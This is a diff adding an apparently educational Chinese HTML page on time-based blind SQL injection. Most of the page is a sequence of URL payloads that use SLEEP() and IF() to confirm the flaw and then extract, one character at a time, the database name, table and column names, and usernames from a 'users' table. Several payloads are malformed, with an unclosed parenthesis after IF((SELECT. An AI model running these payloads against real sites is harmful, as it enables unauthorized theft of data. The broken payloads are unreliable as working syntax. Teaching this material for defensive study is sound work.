@@ -1,0 +1,183 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SQL盲注知识</title>
+    <style>
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: #f4f4f9;
+            color: #333;
+        }
+
+        header {
+            background-color: #2c3e50;
+            color: white;
+            text-align: center;
+            padding: 2em 0;
+        }
+
+        h1 {
+            margin: 0;
+            font-size: 2.5em;
+        }
+
+        nav {
+            background-color: #34495e;
+            color: white;
+        }
+
+        nav ul {
+            list-style-type: none;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+        }
+
+        nav ul li {
+            padding: 1em;
+        }
+
+        nav ul li a {
+            color: white;
+            text-decoration: none;
+        }
+
+        main {
+            max-width: 800px;
+            margin: 2em auto;
+            padding: 0 1em;
+        }
+
+        section {
+            background-color: white;
+            border-radius: 8px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+            margin-bottom: 2em;
+            padding: 2em;
+        }
+
+        h2 {
+            color: #2c3e50;
+            border-bottom: 1px solid #ddd;
+            padding-bottom: 0.5em;
+            margin-bottom: 1em;
+        }
+
+        pre {
+            background-color: #ecf0f1;
+            padding: 1em;
+            border-radius: 4px;
+            overflow-x: auto;
+        }
+
+        code {
+            font-family: 'Courier New', Courier, monospace;
+        }
+
+        footer {
+            background-color: #2c3e50;
+            color: white;
+            text-align: center;
+            padding: 1em 0;
+        }
+    </style>
+</head>
+
+<body>
+    <header>
+        <h1>SQL盲注知识分享</h1>
+    </header>
+    <nav>
+        <ul>
+            <li><a href="index.html">返回学习页面</a></li>
+            <li><a href="#time-based">时间盲注</a></li>
+        </ul>
+    </nav>
+
+    <main>
+        <!-- 时间盲注内容 -->
+        <section id="time-based">
+            <h2>时间盲注技术</h2>
+            <p>时间盲注通过<strong>响应时间差异</strong>推断数据，核心函数：SLEEP() + IF()</p>
+
+            <article>
+                <h3>基础检测</h3>
+                <pre><code>-- 检测时间注入漏洞（延时5秒）
+?id=1' AND SLEEP(5) --+
+                
+-- 条件式延时验证
+?id=1' AND IF(1=1, SLEEP(5), 0) --+</code></pre>
+            </article>
+
+            <article>
+                <h3>数据库信息获取</h3>
+                <pre><code>-- 猜解数据库长度
+?id=1' AND IF((SELECT LENGTH(database())=8, SLEEP(3), 0) --+
+
+-- 逐字符猜解数据库名（ASCII值判断）
+?id=1' AND IF(ASCII(SUBSTR((SELECT database()),1,1))>=115, SLEEP(3), 0) --+</code></pre>
+            </article>
+
+            <article>
+                <h3>表信息获取</h3>
+                <pre><code>-- 确定表的数量
+?id=1' AND IF((SELECT COUNT(table_name) FROM information_schema.tables WHERE table_schema=database())=4, SLEEP(3), 0) --+
+
+-- 猜解第一个表名首字符
+?id=1' AND IF(ASCII(SUBSTR((SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1),1,1))>=101, SLEEP(3), 0) --+</code></pre>
+            </article>
+
+            <article>
+                <h3>数据提取流程</h3>
+                <div class="injection-process">
+                    <div class="step">
+                        <h4>1. 列信息获取</h4>
+                        <pre><code>-- 获取列数
+?id=1' AND IF((SELECT COUNT(column_name) FROM information_schema.columns WHERE table_name='users')=3, SLEEP(3), 0) --+
+
+-- 猜解列名首字符
+?id=1' AND IF(ASCII(SUBSTR((SELECT column_name FROM information_schema.columns WHERE table_name='users' LIMIT 0,1),1,1))>=105, SLEEP(3), 0) --+</code></pre>
+                    </div>
+
+                    <div class="step">
+                        <h4>2. 数据提取</h4>
+                        <pre><code>-- 确定数据长度
+?id=1' AND IF((SELECT LENGTH(username) FROM users LIMIT 0,1)=4, SLEEP(3), 0) --+
+
+-- 逐字符猜解数据
+?id=1' AND IF(ASCII(SUBSTR((SELECT username FROM users LIMIT 0,1),1,1))>=68, SLEEP(3), 0) --+</code></pre>
+                    </div>
+                </div>
+            </article>
+
+            <article class="tips">
+                <h3>技术要点</h3>
+                <ul>
+                    <li>使用二分法加速字符猜解（如 >= 判断）</li>
+                    <li>不同数据库的延时函数差异：
+                        <ul>
+                            <li>MySQL: SLEEP()</li>
+                            <li>PostgreSQL: pg_sleep()</li>
+                            <li>SQL Server: WAITFOR DELAY</li>
+                        </ul>
+                    </li>
+                    <li>注意网络延迟对时间判断的影响</li>
+                </ul>
+            </article>
+        </section>
+
+        <!-- 其他内容保持不变... -->
+    </main>
+
+    <footer>
+        <p>&copy; 2025 网络安全知识分享</p>
+    </footer>
+</body>
+
+</html>
